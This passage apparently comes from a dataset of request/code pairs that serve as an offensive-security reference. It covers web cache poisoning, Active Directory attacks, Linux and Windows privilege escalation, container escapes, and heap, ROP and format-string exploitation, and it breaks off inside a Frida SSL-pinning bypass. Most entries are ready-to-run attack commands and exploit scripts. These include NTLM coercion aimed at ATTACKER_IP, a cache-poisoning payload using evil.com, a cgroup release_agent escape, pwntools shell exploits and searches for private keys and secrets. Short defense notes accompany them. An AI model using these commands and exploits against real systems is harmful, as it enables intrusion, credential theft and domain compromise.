     - X-Forwarded-Host reflected into <link href=...> → poison with
       attacker host → users get JS from attacker.
     - X-Forwarded-Host poisons cache key in CDN → wrong host served.
     - Reflected XSS via header → response cached → stored XSS.

EXAMPLE (PortSwigger-style)
  Discovered: X-Forwarded-Host changes <link rel=stylesheet> in HTML head.
  Response is cached on URL only (header not in vary).
  Send:
    GET /home HTTP/1.1
    Host: target.com
    X-Forwarded-Host: evil.com
  Server caches a response containing
    <link rel=stylesheet href=\"//evil.com/style.css\">
  Every subsequent visitor of /home loads attacker JS.

CACHE DECEPTION (different bug)
  /account.php — dynamic, sensitive. /static/ — cached aggressively.
  Request: /account.php/wcd.css → app routes to account.php (path info),
  cache sees .css and caches the response. Now /account.php/wcd.css is a
  publicly cached copy of the victim's account page. Attacker reads it.

DEFENSE
  - Add every header that affects response to Vary, OR (better) reject
    requests with unexpected hosts at the edge.
  - Strip X-Forwarded-* at the edge before forwarding to origin (or pin
    them to known proxies).
  - Cache only static assets; require explicit cache-control on dynamic.
  - Don't reflect untrusted input into responses without strict allowlist.

LAB: portswigger.net/web-security/web-cache-poisoning""",
},

# ═══════════════════════════════════════════════════════════════════════════
# ACTIVE DIRECTORY ATTACKS (authorized engagements / labs only)
# ═══════════════════════════════════════════════════════════════════════════

{
    "request": "Active Directory full kill chain — high-level map",
    "language": "text", "framework": "ad",
    "code": """Phase            Goal                          Common tooling
─────────────────────────────────────────────────────────────────────────
Initial access   Foothold on a workstation     phishing payload, exposed RDP,
                                                exploit, credential reuse
Recon (host)     Local user, software, AV      whoami /all, systeminfo,
                                                Seatbelt, WinPEAS
Recon (domain)   Users, groups, GPOs, trusts   ldapsearch, BloodHound,
                                                PowerView, SharpHound
Cred theft       Hashes, tickets, browser      mimikatz, lsassy, comsvcs.dll
                  creds, DPAPI                  dump, SafetyKatz, RubeusKB
Priv esc (host)  SYSTEM on the box             unquoted service paths,
                                                weak ACLs, JuicyPotato/
                                                PrintSpoofer (token impers)
Lateral move     New host / new credential     Pass-the-Hash, PTT, WinRM,
                                                PsExec, smbexec, evil-winrm
Domain escal.    Domain Admin or equivalent    Kerberoast, AS-REP roast,
                                                NTLM relay, ADCS abuse,
                                                constrained delegation
Persistence      Survive reboot, password chg  golden ticket, silver ticket,
                                                AdminSDHolder, DCSync
Action obj.      Data, dump NTDS, demo impact  ntdsutil snapshot, secretsdump

KEY PRINCIPLE — most domain compromises don't need an exploit. They use
misconfigurations: weak ACLs, kerberoastable accounts with bad passwords,
unconstrained delegation, dangling DNS, service accounts in DA group, weak
GPO permissions. Bloodhound surfaces these visually.

GOAD (Game Of Active Directory) — full vulnerable AD lab to practice all of
these legally: github.com/Orange-Cyberdefense/GOAD""",
},
{
    "request": "BloodHound — collect data and run high-value queries",
    "language": "bash", "framework": "ad",
    "code": """# Collect (from a domain-joined host or with creds)
# Windows:
SharpHound.exe -c All --zipfilename data.zip
# or PowerShell:
Invoke-BloodHound -CollectionMethods All -ZipFileName data.zip

# Linux remote (no domain join needed):
bloodhound-python -c All -u alice -p Passw0rd! -d corp.local -ns 10.10.10.1

# Start neo4j and BloodHound GUI, drag in the .zip
neo4j start
bloodhound

# HIGH-VALUE CYPHER QUERIES (paste into the Neo4j Raw Query box)

# Shortest path from any owned principal to Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:\"DOMAIN ADMINS@CORP.LOCAL\"}))
RETURN p

# Kerberoastable users with admin rights
MATCH (u:User {hasspn:true})-[r:AdminTo|MemberOf*1..]->(c:Computer)
RETURN u.name, c.name

# Users with DCSync rights (instant domain compromise)
MATCH (u:User)-[r:GetChangesAll|GetChanges]->(d:Domain)
RETURN u.name, d.name

# Users in protected groups (DA, EA, Schema Admins)
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name IN [\"DOMAIN ADMINS@CORP.LOCAL\",\"ENTERPRISE ADMINS@CORP.LOCAL\"]
RETURN u.name

# Computers with unconstrained delegation (juicy lateral)
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

# AS-REP roastable users (no preauth)
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

# Users whose passwords haven't changed in >5 years
MATCH (u:User) WHERE u.pwdlastset < (datetime().epochSeconds - 157680000)
RETURN u.name, datetime({epochSeconds: toInteger(u.pwdlastset)}) ORDER BY u.pwdlastset

# Mark owned principals (in BloodHound right-click → Mark as Owned)
# Then use the built-in \"Find Shortest Paths to Domain Admins from Owned\".""",
},
{
    "request": "Kerberoasting — extract and crack service ticket hashes",
    "language": "bash", "framework": "ad",
    "code": """# Kerberoast = request TGS for accounts with SPN (servicePrincipalName).
# Encrypted with the SERVICE account's password hash. Crack offline.

# Linux (with valid domain creds — any user works)
GetUserSPNs.py -dc-ip 10.10.10.1 corp.local/alice:'Passw0rd!' \\
              -request -outputfile spns.hashes

# Windows (any domain user)
Rubeus.exe kerberoast /outfile:spns.hashes /nowrap
# or PowerView:
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Out-File spns.hashes

# Crack with hashcat
hashcat -m 13100 spns.hashes /usr/share/wordlists/rockyou.txt \\
        -r /usr/share/hashcat/rules/best64.rule -w 3

# Common bad service-account passwords:
#   <CompanyName>123, <ServiceName>123, P@ssw0rd, Welcome1, summer2024
#   Service accounts often skip password rotation policies — easy wins.

# AS-REP ROASTING (no preauth — even cheaper, doesn't need any creds)
GetNPUsers.py -dc-ip 10.10.10.1 corp.local/ -usersfile users.txt \\
              -no-pass -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes rockyou.txt -r best64.rule -w 3

# DEFENSE:
#   - Long random passwords on service accounts (gMSA — managed automatically).
#   - AES encryption only (disable RC4 etherecrypt) — slows cracking massively.
#   - Audit users with SPN that aren't true service accounts.
#   - Set DONT_REQ_PREAUTH=false on all real users; remove it where set.""",
},
{
    "request": "NTLM relay — ntlmrelayx workflow",
    "language": "bash", "framework": "ad",
    "code": """# NTLM relay: capture a forced NTLM auth attempt, relay it to a target
# service that accepts NTLM and doesn't have signing required. You become
# the authenticated user on the target.

# Targets vulnerable when SMB signing is OFF (most common in older domains):
nmap --script smb2-security-mode -p445 10.10.10.0/24 -oG smb-signing.txt
grep \"Message signing enabled but not required\" smb-signing.txt > targets.txt
awk '{print $2}' targets.txt > relay-targets.txt

# Start the relay listener (relays to LDAP — most universal)
sudo ntlmrelayx.py -tf relay-targets.txt -smb2support -socks
# Other useful targets:
#   -t ldaps://dc.corp.local --add-computer ATTACKER01  (add machine acct)
#   -t mssql://sql.corp.local -q \"SELECT @@version\"     (run query)
#   -t http://exch.corp.local/EWS/Exchange.asmx           (read mail)

# COERCE A VICTIM TO AUTH TO YOU — the missing piece:
# 1) PetitPotam (CVE-2021-36942) — coerce auth from a host
PetitPotam.py -d corp.local -u alice -p 'Passw0rd!' \\
              ATTACKER_IP DC_IP

# 2) PrinterBug (MS-RPRN) — coerce auth via spooler
printerbug.py corp.local/alice:'Passw0rd!'@DC_IP ATTACKER_IP

# 3) DFSCoerce (CVE-2022-26925)
dfscoerce.py -u alice -p 'Passw0rd!' -d corp.local ATTACKER_IP DC_IP

# 4) ShadowCoerce — even MS Defender for IDP often misses this
shadowcoerce.py -u alice -p 'Passw0rd!' -d corp.local ATTACKER_IP TARGET

# When DC's machine account auth gets relayed to LDAP with --add-computer,
# you control a new machine account → use it for RBCD attacks.

# DEFENSE:
#   - Enable SMB signing required + LDAP channel binding required.
#   - Disable NTLM where possible; force Kerberos.
#   - Patch PetitPotam / DFSCoerce / etc.""",
},
{
    "request": "ADCS attacks — ESC1 through ESC8",
    "language": "text", "framework": "ad",
    "code": """ADCS = Active Directory Certificate Services. Misconfigured templates
let low-priv users request a cert as a high-priv user (or as a DC) →
Kerberos auth → domain takeover.

ENUMERATE — Certify (Windows) / Certipy (Linux):
  certipy find -u alice@corp.local -p Passw0rd! -dc-ip 10.10.10.1 \\
              -vulnerable -stdout

ESC1 — Template lets enrollee supply Subject Alternative Name (SAN) +
       allows Client Authentication EKU.
  Request a cert with SAN=DA_USER, then PKINIT auth as DA_USER.
  certipy req -u alice@corp.local -p Passw0rd! -ca CORP-CA \\
             -template VulnTemplate -upn administrator@corp.local
  certipy auth -pfx administrator.pfx

ESC2 — Any-purpose EKU OR no EKU. Cert can authenticate AND sign as
       any user via SChannel. Mostly the same as ESC1 in practice.

ESC3 — Enrollment Agent template. Request an enrollment-agent cert,
       then use it to enroll \"on behalf of\" any user.
  certipy req -u alice -p X -template EnrollAgent -ca CA
  certipy req -u alice -p X -template User -ca CA \\
             -on-behalf-of corp\\\\administrator -pfx alice.pfx

ESC4 — Vulnerable ACL on the template (you have Write on it). Grant
       yourself enroll, edit settings to make it ESC1-vulnerable, request,
       restore.

ESC5 — Vulnerable ACL on the CA / PKI objects in AD. Similar to ESC4
       but at the CA level — full PKI takeover.

ESC6 — CA-level flag EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA. Lets ANY
       enrollee specify SAN regardless of template. Critical.
       certipy ca -enable-config or check via certipy find.

ESC7 — Vulnerable CA security (Manage CA / Manage Certificates rights).
       Approve your own pending requests, or modify CA settings.

ESC8 — HTTP enrollment endpoint without auth or with NTLM relay → relay
       coerced auth (PetitPotam) to /certsrv → request a DC-auth cert →
       golden cert.
  ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp \\
                --adcs --template DomainController

DEFENSE:
  - Audit templates: Manage-Adcs (Microsoft) or certipy find -vulnerable.
  - Remove SAN supply rights from low-priv enrollees.
  - Force HTTPS+EPA on web-enrollment; better yet, disable web enrollment.
  - Enable CA-level subject attribute lockdown.
  - Apply MS KB5014754 (strong cert mapping) to defeat ESC1/3 takeover
    even when the template is vulnerable.""",
},

# ═══════════════════════════════════════════════════════════════════════════
# LINUX & WINDOWS PRIVILEGE ESCALATION
# ═══════════════════════════════════════════════════════════════════════════

{
    "request": "Linux privilege escalation — full enumeration workflow",
    "language": "bash", "framework": "privesc",
    "code": """# AUTOMATED FIRST PASS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \\
  | sh -s -- -a > linpeas.out 2>&1
# Or run linpeas.sh from local. Read the OUT — anything red/yellow → look closer.

# MANUAL CHECKLIST (don't skip — automated tools miss recent CVEs)

# 1. Kernel + distro
uname -a; cat /etc/os-release
# Match against searchsploit:
searchsploit linux kernel <ver>

# 2. Sudo rights (ALWAYS run)
sudo -l   # any NOPASSWD? any binary that can shell out?
# Look up everything with NOPASSWD on https://gtfobins.github.io/

# 3. SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Cross-ref each unfamiliar one with gtfobins.

# 4. Capabilities (often missed by auto tools)
getcap -r / 2>/dev/null
# cap_setuid+ep on perl/python/php → instant root.

# 5. Cron jobs (writable + interesting)
ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null
cat /etc/crontab
# Anything running as root that I can write to or modify? PATH abuse?

# 6. Writable paths in PATH
echo $PATH | tr ':' '\\n' | xargs -I{} ls -ld {} 2>/dev/null | grep w

# 7. Service / config writable
ls -la /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null
# Any service Unit file world-writable? ExecStart manipulation = root.

# 8. NFS exports with no_root_squash
showmount -e <nfs-server>
cat /etc/exports
# no_root_squash → mount, write SUID binary as root → exec from victim.

# 9. /tmp races, /dev/shm, world-writable scripts
find / -writable -type f 2>/dev/null | grep -v /proc | grep -v /sys | head

# 10. Database with weak creds + UDF / xp_cmdshell access
# 11. Docker socket exposure
ls -la /var/run/docker.sock
# Member of docker group → root: docker run -v /:/mnt --rm -it alpine chroot /mnt

# 12. Polkit / pwnkit (CVE-2021-4034) — patch check
ldd /usr/bin/pkexec
# Run PoC if pkexec is SUID and unpatched.

# 13. Recent kernel exploits to fingerprint:
#  - CVE-2022-0847 (Dirty Pipe)            5.8 ≤ k < 5.16.11
#  - CVE-2022-2588 (cls_route UAF)
#  - CVE-2023-0386 (overlayfs)              k < 6.2
#  - CVE-2023-32233 (nf_tables UAF)
#  - CVE-2024-1086 (nf_tables again)

# 14. Misc (read carefully):
ls -la /home /root 2>/dev/null              # what other users exist
cat /home/*/.bash_history 2>/dev/null       # creds, paths
cat /etc/passwd                              # mapping + odd shells
find / -name "id_rsa" 2>/dev/null            # private keys
find / -name "*.kdbx" 2>/dev/null            # KeePass DBs
find / -name ".env" 2>/dev/null              # config secrets
find / -name "*.bak" 2>/dev/null
""",
},
{
    "request": "GTFOBins / LOLBAS lookup workflow",
    "language": "text", "framework": "privesc",
    "code": """GTFOBins (Linux) — gtfobins.github.io
LOLBAS  (Windows) — lolbas-project.github.io

Each entry tells you what a common binary can do beyond its intended use:
shell escape, file read/write, sudo abuse, capability abuse, suid abuse,
download, upload.

LOOKUP PATTERN (Linux):
  1. sudo -l → I can run /usr/bin/find as root, NOPASSWD.
  2. Open gtfobins.github.io/gtfobins/find/
  3. Pick \"sudo\" section: sudo find . -exec /bin/sh \\; -quit  → root shell.

DEFENSE-WORTHY EXAMPLES:
  bash, sh, perl, python, ruby, lua, node — obviously
  awk, sed, find, vim, less, more, view, man — all have shell escapes
  cp, mv, dd, tee — write file as elevated user
  cat, head, tail, less — read protected files
  tar, zip, 7z — sometimes have command-exec flags
  systemctl, service — start arbitrary unit
  apt, apt-get, pip, npm — pre/post-install scripts run as root
  docker, lxc — container escape via mount

LOLBAS QUICK HITS (Windows living-off-the-land binaries):
  certutil          — download files, decode base64
  bitsadmin         — download via BITS
  powershell.exe    — obvious
  wmic              — execute, list creds
  rundll32          — load arbitrary DLL
  regsvr32          — load script (.sct)
  mshta             — run HTA from URL
  cmd.exe /c        — chain everything
  msbuild.exe       — compile + run on the fly
  installutil       — exec via .NET attribute
  forfiles          — exec command per file
  PsExec            — lateral / SYSTEM with -s

USE CASE: AV blocks your dropper.exe but msbuild.exe loading your .csproj
is signed Microsoft tooling — bypasses many basic application allowlists.""",
},
{
    "request": "Windows priv esc — token impersonation (Potato family)",
    "language": "powershell", "framework": "privesc",
    "code": """# When you have SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege,
# you can capture / coerce a SYSTEM token and impersonate it. This privilege
# is granted by default to most service accounts (IIS_IUSRS, NT SERVICE\\*).

whoami /priv
# Look for: SeImpersonatePrivilege  Enabled

# JuicyPotato (Server 2016 / Win10 1803-) — uses COM activation via DCOM
JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe \\
                -t * -c {CLSID}

# RoguePotato (Server 2019 / Win10 1809+) — uses an OXID resolver redirect
RoguePotato.exe -r ATTACKER_IP -e \"cmd.exe\" -l 9999

# PrintSpoofer (Server 2019/2022, Win10 1809+) — uses MS-PRN spooler
PrintSpoofer.exe -i -c \"cmd.exe\"
PrintSpoofer.exe -c \"powershell -enc <base64>\"

# GodPotato (any modern Windows up through Win11 / Server 2022)
GodPotato.exe -cmd \"cmd /c whoami\"

# DcomPotato — modern alternative when others are patched
# SweetPotato — wrapper that picks the best Potato for you
SweetPotato.exe -p \"c:\\\\windows\\\\system32\\\\cmd.exe\"

# Detection / hardening (blue side):
#   - Disable Print Spooler on servers that don't print
#   - DCOM hardening (CVE-2021-26414 patches)
#   - Don't grant SeImpersonate to weird accounts
#   - Use Protected Process Light (PPL) for LSASS to limit downstream damage""",
},
{
    "request": "Linux capabilities abuse — common privesc paths",
    "language": "bash", "framework": "privesc",
    "code": """# Capabilities = fine-grained powers usually held by root, optionally
# attached to a specific binary. Misuse → privesc without SUID.

# Find them
getcap -r / 2>/dev/null

# Common dangerous ones:

# cap_setuid+ep on a scripting interpreter → instant root
/usr/bin/python3 -c \"import os; os.setuid(0); os.system('/bin/sh')\"
# (works if python has cap_setuid+ep)

# cap_dac_read_search+ep → read any file regardless of perms
# Use a binary like cat with that cap, or use a Python wrapper.

# cap_dac_override+ep → write any file
# Modify /etc/passwd, /etc/sudoers, or shadow.

# cap_sys_ptrace+ep → ptrace any process (incl. PID 1) → arbitrary code as root

# cap_net_admin+ep on tcpdump → read packets system-wide; combine with
#   cap_net_raw+ep → craft packets, bypass firewalls.

# cap_chown+ep → chown any file to anyone — chown root:root /tmp/myshell
#   then chmod +s, run.

# cap_sys_module+ep → load arbitrary kernel modules → unrestricted root.

# REFERENCE — gtfobins.github.io has \"Capabilities\" sections for every
# binary listed; check there.

# CHECK YOUR PROCESS HAS A CAPABILITY (the binary may have it but not
# inherited — caps are tricky):
capsh --print

# DEFENSE
#   - Audit and remove unnecessary caps: setcap -r /path/to/binary
#   - Prefer kernel-side mechanisms (seccomp, namespaces) over caps when
#     designing privilege boundaries.""",
},
{
    "request": "container escapes — Docker, runc, capabilities",
    "language": "bash", "framework": "privesc",
    "code": """# Inside a container — am I escapeable?

# 1. ARE YOU PRIVILEGED?
cat /proc/1/status | grep CapEff
# CapEff: 0000003fffffffff → fully privileged. Easy escape.
# Privileged container → mknod a disk device → mount host disk:
mkdir /mnt/host
mknod /dev/sda b 8 0
mount /dev/sda1 /mnt/host
ls /mnt/host  # → host root filesystem

# 2. DOCKER SOCKET MOUNTED INTO CONTAINER (very common misconfig)
ls -la /var/run/docker.sock
# Yes → spawn a new privileged container that mounts host /
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host alpine chroot /host sh

# 3. MOUNTED HOST FILESYSTEM (-v /:/host or -v /etc:/etc etc)
mount | grep host
ls /host

# 4. CAP_SYS_ADMIN granted (without --privileged)
# Mount cgroup, write release_agent → host RCE on next process exit:
# (example for cgroup v1)
mkdir /tmp/cg
mount -t cgroup -o rdma cgroup /tmp/cg
mkdir /tmp/cg/x
echo 1 > /tmp/cg/x/notify_on_release
cat /tmp/cg/release_agent  # remember
echo \"$(pwd)/exploit.sh\" > /tmp/cg/release_agent
echo $$ > /tmp/cg/x/cgroup.procs
# (exploit.sh on host runs as root)

# 5. CVE-2019-5736 (runc) — overwrite /proc/self/exe of the runc binary
#    (patched everywhere now, but old fleets still vulnerable)

# 6. CVE-2022-0185 (legacy_parse_param) — kernel
# 7. CVE-2024-21626 (runc leaked file descriptor) — recent

# 8. KERNEL EXPLOIT (containers share host kernel)
uname -a  # match against pwnkit / dirtypipe / overlayfs / nf_tables CVEs.

# 9. MISCONFIG: hostNetwork + hostPID + hostIPC together → talk to host pod
# infrastructure (in K8s)

# DEFENSE
#   - Don't mount docker.sock into containers.
#   - Drop ALL caps; add only what's needed (--cap-drop ALL --cap-add net-bind-service).
#   - --read-only --tmpfs /tmp.
#   - --security-opt=no-new-privileges.
#   - Run as non-root (USER inside Dockerfile).
#   - Use rootless docker / podman.
#   - Apply seccomp + AppArmor profiles.""",
},

# ═══════════════════════════════════════════════════════════════════════════
# BINARY EXPLOITATION (CTF / authorized research)
# ═══════════════════════════════════════════════════════════════════════════

{
    "request": "exploit dev — mitigations and how each is bypassed",
    "language": "text", "framework": "exploit-dev",
    "code": """MITIGATION       WHAT IT DOES                  COMMON BYPASS
────────────────────────────────────────────────────────────────────
NX / DEP         No exec on stack/heap         ret2libc, ROP, mprotect ROP,
                                                JIT spray (where applicable)
ASLR             Randomize base addresses      info leak (format string,
                                                OOB read, partial overwrite),
                                                brute on 32-bit
PIE              Randomize binary base too     same — info leak required
Stack canary     Detect overflow into return    leak the canary (info leak,
                                                fork-without-rerand, side
                                                channels), or overwrite
                                                fewer bytes (partial)
RELRO (full)     GOT read-only after init      ROP through .data, hijack
                                                __libc_atexit / __free_hook
                                                / tcache; or write-where
                                                primitive into writable area
SafeSEH/SEHOP    Validate Windows SEH chain    overwrite vt of object,
                                                ROP without SEH
CFG (Win)        Indirect call target valid    use legitimate target as
                                                gadget, ROP into ret
CFI / CET (IBT)  Indirect call must land in    only specific bypasses
                  endbr; shadow stack            (CET-IBT signal abuses,
                                                JOP gadgets if no shadow)
SMEP / SMAP      Kernel can't exec/read user   ROP entirely in kernel,
                  pages                         CR4 toggle, use kASLR leak
KASLR            Randomize kernel base         leak via /proc/kallsyms
                                                if accessible, side-channels,
                                                prefetch (Meltdown class)
AppArmor /       Confine binary by profile     escape via legitimate ops,
SELinux                                         exploit policy holes
seccomp          Syscall allowlist             only call allowed syscalls,
                                                find rwx via mprotect if
                                                allowed, side-channels

COMMON ESCALATION:
  1. Find a memory-corruption primitive (overflow, UAF, fmt string).
  2. Get an info leak → defeat ASLR (libc base, binary base, canary).
  3. Get write-where primitive (or arbitrary-write).
  4. Pivot to control of $rip → ROP chain.
  5. ROP to mprotect or syscall(execve, /bin/sh) → shell.

GOOD SOURCES:
  Phrack archives, especially Phrack 0x49+ (modern series)
  liveoverflow.com (binary exploitation YouTube — best free course)
  pwn.college (curriculum from ASU — free, deep)
  ctftime.org → past pwn challenges — read writeups""",
},
{
    "request": "ROP chain construction with pwntools + ROPgadget",
    "language": "python", "framework": "exploit-dev",
    "code": """from pwn import *

# 1. CONTEXT
context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')   # match server's libc exactly
context.log_level = 'debug'

p = process('./vuln')              # for local
# p = remote('chal.ctf', 31337)    # for remote

# 2. STAGE 1 — leak libc base
# Need an overflow + something that prints. Use puts@plt to leak puts@got.
offset = 72   # found via pattern_create / cyclic; here assumed

rop = ROP(elf)
rop.call('puts', [elf.got['puts']])      # puts(puts@got) → leak puts addr
rop.call('main')                         # come back to vuln

payload  = flat({offset: rop.chain()})
p.sendlineafter(b'> ', payload)
leak = u64(p.recvline().strip().ljust(8, b'\\x00'))
log.success(f'puts leak: {hex(leak)}')

libc.address = leak - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

# 3. STAGE 2 — ret2libc with full leak
# Many libc versions enforce stack alignment (16-byte) at execve. Add an
# extra 'ret' gadget if your chain crashes inside system().
ret = rop.find_gadget(['ret'])[0]

rop2 = ROP([elf, libc])
rop2.raw(ret)                            # alignment
rop2.call(libc.sym['system'], [next(libc.search(b'/bin/sh'))])

payload  = flat({offset: rop2.chain()})
p.sendlineafter(b'> ', payload)

p.interactive()

# Tools:
#   ROPgadget --binary ./vuln           # list all gadgets
#   ROPgadget --binary ./vuln --rop     # auto-build a chain (try first)
#   one_gadget libc.so.6                # find single-RIP-to-shell offsets
#   ropper -f ./vuln --search \"pop rdi\"

# Pwntools gotchas:
#   - Use rop.call() not rop.system() in newer versions.
#   - For 32-bit, args are pushed: rop.call('system', [bin_sh]) handles it.
#   - context.terminal = ['tmux', 'splitw', '-h']  → gdb.attach(p) opens
#     a debugger pane.""",
},
{
    "request": "format string exploit — full primitive walkthrough",
    "language": "python", "framework": "exploit-dev",
    "code": """# Format string bug: printf(user_input)  — unsanitized format string.
# Gives you READ (any address) and WRITE (any address) primitives.

# 1. FIND OFFSET — where my buffer lands in printf's argument list
# Send: \"AAAAAAAA %p %p %p %p %p %p %p %p %p %p\"
# Look at output. The token equal to 0x4141414141414141 tells you the
# offset N. (e.g., the 8th %p shows AAAAAAAA → offset = 8.)

# 2. READ ARBITRARY ADDRESS
from pwn import *
p = process('./fmt')
addr = 0x404010                              # got entry to leak
payload = p64(addr) + b'%8$s'               # offset 8, then read at it
p.sendline(payload)
print(p.recvline())

# 3. WRITE ARBITRARY VALUE
# %n writes the count of bytes printed so far to a pointer in args.
# Use %hn (2-byte) to control bytes individually.
# pwntools fmtstr_payload does the math:
payload = fmtstr_payload(8, {0x404010: 0xdeadbeef})
p.sendline(payload)
# Now *(0x404010) == 0xdeadbeef.

# 4. PUT IT TOGETHER — leak libc, overwrite GOT entry
elf = ELF('./fmt')
libc = ELF('./libc.so.6')

# Leak libc.puts via puts@got
payload = fmtstr_payload(8, {}, write_size='byte') + b'AAA'  # padding
# Actually for a leak just send:
p.sendline(p64(elf.got['puts']) + b'%8$s')
leak = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))
libc.address = leak - libc.sym['puts']

# Overwrite printf@got → system, then on next printf call with /bin/sh as
# input, system runs.
payload = fmtstr_payload(8, {elf.got['printf']: libc.sym['system']})
p.sendline(payload)
p.sendline(b'/bin/sh')
p.interactive()

# CAVEATS:
#   - x64 has args in registers first. Pwntools handles this; manually
#     it means offsets are different from x86.
#   - PIE on means GOT addresses are also randomized — you need a leak
#     of binary base first via %p of saved RIP / canary.
#   - Full RELRO → GOT is read-only; pivot to fini_array, .data, hooks.""",
},
{
    "request": "heap exploitation — UAF and tcache poisoning (glibc)",
    "language": "text", "framework": "exploit-dev",
    "code": """USE-AFTER-FREE (UAF)
  free(p) but the variable p still points there. Allocator now hands
  the same chunk to a new alloc → two pointers to same memory, with
  one of them holding sensitive metadata (function ptrs, sizes...).

EXPLOIT FLOW (typical):
  1. Allocate object A at slot S (has function ptr field).
  2. Free A. S goes onto tcache/fastbin freelist.
  3. Allocate object B same size — gets slot S.
  4. Write to B (so S now holds attacker-controlled bytes).
  5. Trigger A's vtable call → control PC.

TCACHE POISONING (glibc 2.26+, primary fast path)
  Tcache freelist is a singly-linked list of chunks per size class. The
  fwd pointer is the first qword of the FREED chunk.

  glibc 2.32+: pointers are mangled with PROTECT_PTR
    mangled = (addr_of_chunk_storing_ptr >> 12) ^ raw_ptr

  Goal — make the next malloc(SIZE) return an arbitrary address.

  Simplified flow (glibc < 2.32 — no mangling):
    free(A);  free(B);          # tcache: B → A (head is B)
    *((void**)B) = TARGET;      # poison fwd ptr of B
    malloc(SIZE);                # returns B
    malloc(SIZE);                # returns TARGET — arbitrary write next

  glibc ≥ 2.32:
    Need a heap-base leak to compute the mangled value. Either via an
    info leak primitive earlier, or a partial overwrite that doesn't
    require full unmangle.

USEFUL TARGETS (where to point):
  - __free_hook / __malloc_hook  (removed in glibc 2.34+ — use other paths)
  - _IO_2_1_stdout_ vtable / _IO_FILE structures (FSOP)
  - tls_dtor_list (CTF favorite)
  - environ (often holds stack address — leak)
  - any program-specific function pointer (callback, vtable in C++ obj)

GLIBC IO / FSOP (modern path post-hooks)
  House of Apple, House of Emma, House of Banana — chains that turn an
  arbitrary write into RCE via crafting a fake _IO_FILE that calls
  vtable->__finish or __overflow at exit/cleanup.

LEARNING PATH:
  1. how2heap (github.com/shellphish/how2heap) — every primitive demoed.
  2. heap-exploitation.dhavalkapil.com — readable walkthrough.
  3. CTF challenges tagged \"heap\" on CTFtime.

DEFENSE (blue side / fuzzing):
  - Sanitizers in CI: ASAN / UBSAN / MSAN catch most UAFs.
  - Hardened allocators: scudo (Android), GWP-ASAN, mimalloc with
    secure mode.
  - LeakSanitizer for libs you ship.""",
},

# ═══════════════════════════════════════════════════════════════════════════
# REVERSE ENGINEERING
# ═══════════════════════════════════════════════════════════════════════════

{
    "request": "Ghidra workflow — first hour on a new binary",
    "language": "text", "framework": "reverse-eng",
    "code": """1. CREATE PROJECT, IMPORT BINARY.
   File → New Project → Non-Shared. Drag binary in. Pick architecture
   (usually auto). Analyze with default options + (turn on) Decompiler
   Parameter ID + Reference + Constant Reference.

2. RUN AUTO-ANALYSIS. Wait. Ghidra finds functions, references, strings.

3. SCAN STRINGS WINDOW (Window → Defined Strings).
   Sort by length. Look for: format strings, error messages, paths,
   URLs, magic constants. Right-click → \"References to\" jumps to code.

4. SCAN SYMBOL TREE → Functions.
   Look for: main, _start, custom-named functions, anything matching
   project structure. Rename _start callee to entry. Rename main if found.

5. DECOMPILE main.
   F5 in Decompiler view. If args/locals are messy:
     - Right-click variable → Rename Variable / Retype Variable.
     - Right-click function in listing → Edit Function Signature.
   Iterate. Better names = clearer chain across calls.

6. CROSS-REFS (Ctrl+Shift+F).
   Right-click any symbol → References → Show References To. Build a
   call graph mentally as you go.

7. STRUCTS.
   When code does ptr[8] / ptr+0x10, hit / on the offset → Edit Structure.
   Define field types and names. Apply struct: right-click var →
   Auto Create Structure or Retype.

8. MARK INTERESTING.
   Bookmarks (Ctrl+B). Use to track: vulnerability candidates, encryption
   routines, network calls, parsers. Bookmark categories help.

9. COMMON RE GOALS
   - Find license check  → string \"invalid\" → xref → patch jump.
   - Find auth routine   → strcmp/memcmp on password → trace input source.
   - Find crypto         → entropy of strings, S-box constants
                           (look up first qword in https://aes-finder.online/).
   - Find C2 URL         → string list, look for http/.com/.net.
   - Find anti-debug     → IsDebuggerPresent / NtQueryInformationProcess
                           xrefs / ptrace check on Linux.

10. SCRIPTING.
    Window → Script Manager. Examples shipped:
      - InstructionSearch.java  — pattern-match opcodes
      - ExportFunctionsAsCSV.java
    Write your own in Python (Jython 2.7) or Java for repetitive tasks.

11. PATCHING.
    Listing → right-click on instruction → Patch Instruction.
    Then File → Export Program → original format.

12. DEBUGGER (since Ghidra 10.x).
    Debugger view → Connect to gdb-server / lldb-rsp / Wine. Step over
    decompiled code with breakpoints in the listing.""",
},
{
    "request": "Frida — hooking and patching at runtime",
    "language": "javascript", "framework": "reverse-eng",
    "code": """// Frida instruments any process at runtime — Android, iOS, Linux, Win, Mac.
// Install: pip install frida-tools  ;  download frida-server for the target.

// LIST PROCESSES
//   frida-ps -U      (USB device)
//   frida-ps -R      (remote)

// SPAWN + ATTACH WITH SCRIPT
//   frida -U -f com.target.app -l hooks.js --no-pause

// HOOK A JAVA METHOD (Android)
Java.perform(() => {
    const Activity = Java.use('android.app.Activity');
    Activity.onResume.implementation = function () {
        console.log('[+] Activity.onResume called: ' + this);
        return this.onResume();   // call original
    };
});

// BYPASS ROOT DETECTION (common pattern)
Java.perform(() => {
    const Build = Java.use('android.os.Build');
    Build.TAGS.value = 'release-keys';                // hide test-keys

    const File = Java.use('java.io.File');
    File.exists.implementation = function () {
        const path = this.getAbsolutePath();
        if (/\\/(su|busybox|magisk|xposed)/i.test(path)) {
            console.log('[+] root check on ' + path + ' → false');
            return false;
        }
        return this.exists();
    };
});

// BYPASS SSL PINNING — okhttp3 (most modern Android apps)
Java.perform(() => {
    const CertificatePinner = Java.use('okhttp3.CertificatePinner');
